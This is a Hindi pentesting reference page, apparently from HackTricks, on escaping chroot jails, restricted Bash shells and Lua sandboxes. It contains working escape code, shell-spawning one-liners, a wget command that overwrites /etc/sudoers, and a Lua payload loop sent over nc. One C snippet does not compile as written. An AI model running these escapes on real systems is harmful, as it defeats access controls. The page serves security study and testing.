# Jails से बाहर निकलना

## **GTFOBins**

**[**https://gtfobins.github.io/**](https://gtfobins.github.io) **में खोजें कि क्या आप "Shell" property वाली किसी binary को execute कर सकते हैं**

## Chroot Escapes

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) से: chroot mechanism का उद्देश्य **जानबूझकर छेड़छाड़** करने वाले **privileged** (**root**) **users** से सुरक्षा प्रदान करना **नहीं है**। अधिकांश systems पर, chroot contexts ठीक से stack नहीं होते और **पर्याप्त privileges वाले chrooted programs बाहर निकलने के लिए दूसरा chroot कर सकते हैं**।\
आमतौर पर इसका अर्थ है कि escape करने के लिए आपको chroot के अंदर root होना आवश्यक है।<sup>[[4]](#references)</sup>

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) को निम्नलिखित scenarios का दुरुपयोग करने और `chroot` से बाहर निकलने के लिए बनाया गया था।<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> यदि आप chroot के अंदर **root** हैं, तो **एक और chroot** बनाकर **बाहर निकल सकते हैं**। ऐसा इसलिए है क्योंकि (Linux में) 2 chroots एक साथ मौजूद नहीं रह सकते, इसलिए यदि आप एक folder बनाते हैं और फिर उस नए folder पर **एक नया chroot बनाते हैं**, जबकि **आप उसके बाहर हैं**, तो अब आप **नए chroot के बाहर** होंगे और इसलिए FS में होंगे।
>
> ऐसा इसलिए होता है क्योंकि आमतौर पर chroot आपके working directory को निर्दिष्ट directory में move नहीं करता, इसलिए आप chroot बना सकते हैं लेकिन उसके बाहर रह सकते हैं।<sup>[[4]](#references)[[5]](#references)</sup>

आमतौर पर आपको chroot jail के अंदर `chroot` binary नहीं मिलेगी, लेकिन आप एक binary को **compile, upload और execute** कर सकते हैं:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> यह पिछले मामले के समान है, लेकिन इस मामले में **attacker वर्तमान directory के लिए एक file descriptor store करता है** और फिर **एक नए folder में chroot बनाता है**। अंत में, क्योंकि उसके पास chroot के **बाहर** उस **FD** का **access** है, वह उस तक पहुंच प्राप्त करता है और **escape** कर जाता है।<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD को Unix Domain Sockets के माध्यम से पास किया जा सकता है, इसलिए:
>
> - एक child process (fork) बनाएँ
> - Parent और child के बीच communication के लिए UDS बनाएँ
> - Child process में अलग folder पर chroot चलाएँ
> - Parent proc में नए child proc chroot के बाहर मौजूद folder का FD बनाएँ
> - उस FD को UDS का उपयोग करके child procc को पास करें
> - Child process उस FD पर chdir करे, और क्योंकि वह उसके chroot के बाहर है, वह jail से escape कर जाएगा।<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Root device (/) को chroot के अंदर मौजूद directory में Mount करना
> - उस directory में chroot करना
>
> यह Linux में संभव है।<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - chroot के अंदर मौजूद directory में procfs को Mount करें (यदि यह पहले से मौजूद नहीं है)
> - ऐसे pid को खोजें जिसका root/cwd entry अलग हो, जैसे: /proc/1/root
> - उस entry में chroot करें।<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - एक Fork (child proc) बनाएँ और FS में किसी अलग, अधिक गहरी folder पर chroot करके उस पर CD करें
> - Parent process से उस folder को, जिसमें child process मौजूद है, children के chroot से पहले वाली folder में move करें
> - यह children process स्वयं को chroot के बाहर पाएगा।<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - कोई process `ptrace` के साथ attach कर सकता है या नहीं, यह credentials, capabilities और Yama जैसे enabled security modules पर निर्भर करता है; इसलिए same-user debugging system policy द्वारा restricted हो सकती है।<sup>[[8]](#references)</sup>
> - यदि attachment permitted हो, तो आप किसी process में ptrace करके उसके अंदर shellcode execute कर सकते हैं ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace))।<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Jail के बारे में जानकारी प्राप्त करें:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH में बदलाव करें

जाँचें कि क्या आप PATH env variable में बदलाव कर सकते हैं।<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim का उपयोग

यदि Vim उपलब्ध है, तो इसके `shell` विकल्प को ऐसे shell पर सेट करें जिसे आप execute कर सकते हैं और `:shell` invoke करें।<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers और help viewers

कई restricted environments में अब भी **pagers** या **help viewers** उपलब्ध रहते हैं। `PATH` को फिर से बनाने की कोशिश करने की तुलना में इनका दुरुपयोग करना आमतौर पर अधिक तेज़ होता है।
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
यदि `git` उपलब्ध है, तो इसका `--paginate` विकल्प output को `less` या `$PAGER` पर भेजता है, जो pager escape उपलब्ध होने पर उपयोगी है।<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### सामान्य GTFOBins one-liners

एक बार यह पता चल जाए कि कौन-से binaries उपलब्ध हैं, तो पहले स्पष्ट shell spawners का परीक्षण करें:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
यदि आप किसी अनुमत **command** में केवल **arguments inject** कर सकते हैं (इसे स्वतंत्र रूप से चलाने के बजाय), तो **GTFOArgs** भी देखें।<sup>[[17]](#references)</sup>

### Script बनाएँ

जाँचें कि क्या आप content के रूप में _/bin/bash_ वाली executable file बना सकते हैं
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH से bash प्राप्त करें

यदि आप ssh के माध्यम से access कर रहे हैं, तो आप अक्सर server से restricted login shell के बजाय **किसी अलग program** को execute करने के लिए कह सकते हैं।<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
यदि `ssh` स्थानीय रूप से अनुमत कुछ binaries में से एक है, तो याद रखें कि इसका दुरुपयोग **GTFOBin** के रूप में भी किया जा सकता है; इसके `LocalCommand` और `ProxyCommand` options स्थानीय रूप से configured helper commands को execute करते हैं।<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Bash में `nameref` assignments को किसी अन्य variable पर redirect करता है, जबकि `BASH_CMDS` में कोई element जोड़ने से वह command Bash की internal command hash table में जुड़ जाती है।<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget का `-O` option डाउनलोड की गई सामग्री को निर्दिष्ट output file में लिखता है; यदि वह path writable है, तो इससे `/etc/sudoers` जैसी file overwrite हो सकती है।<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

कुछ environments आपको plain `rbash` में नहीं भेजते, बल्कि `git-shell`, `rssh`, या `lshell` जैसे **wrappers** में भेजते हैं:

- `git-shell` केवल server-side Git commands और `~/git-shell-commands/` के अंदर मौजूद किसी भी चीज़ को स्वीकार करता है। यदि वह directory मौजूद है, तो अनुमत custom actions की सूची देखने के लिए `help` चलाएँ। यदि आप वहाँ **write** कर सकते हैं, तो उस directory में रखी गई कोई भी executable वहाँ से पहुँच योग्य हो जाती है।<sup>[[3]](#references)</sup>
- `rssh` / `lshell` आमतौर पर केवल `scp`, `sftp`, `rsync`, या Git-style operations की अनुमति देते हैं। ऐसे मामलों में पहले **file write primitives** पर ध्यान दें: `authorized_keys`, कोई shell startup file, या helper script किसी writable location में upload करें और फिर `ssh -t ...` के साथ दोबारा connect करें।
- यदि wrapper केवल command line को filter करता है, तो पहुँच योग्य binaries की सूची बनाएँ और फिर **GTFOBins / GTFOArgs** पर pivot करें।

### Other tricks

यह भी जाँचें:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**यह page भी interesting हो सकता है:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

अगले page पर python jails से escape करने की tricks दी गई हैं:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

इस page पर आपको lua के अंदर उपलब्ध global functions मिल सकते हैं: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)।<sup>[[16]](#references)</sup>

जब standard `load`, `string.char`, और `os.execute` functions उपलब्ध हों, तो वे इस chunk को build और run कर सकते हैं।<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
एक table function को dot syntax के बजाय `rawget` से भी प्राप्त किया जा सकता है।<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
`pairs` का उपयोग library table की गणना करने के लिए करें।<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
`pairs` द्वारा table indices को enumerate करने का क्रम निर्दिष्ट नहीं है, इसलिए किसी विशेष function के पहले दिखाई देने पर निर्भर न रहें। यदि आपको किसी एक विशिष्ट function को execute करना है, तो आप अलग-अलग lua environments load करके और library के पहले function को call करके brute force attack कर सकते हैं।<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interactive lua shell प्राप्त करें**: यदि आप एक सीमित lua shell के अंदर हैं, तो `debug.debug()` कॉल करके एक नया lua shell (और उम्मीद है कि unlimited) प्राप्त कर सकते हैं, जो एक interactive mode में प्रवेश करता है।<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: विभिन्न chroot Solutions से बाहर निकलने का तरीका (Bucsay Balazs, DeepSec talk और slides)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git दस्तावेज़](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux manual पृष्ठ](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux manual पृष्ठ](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux manual पृष्ठ](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux manual पृष्ठ](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git दस्तावेज़](https://git-scm.com/docs/git)
- [10] [:shell – Vim दस्तावेज़](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD manual पृष्ठ](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD manual पृष्ठ](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
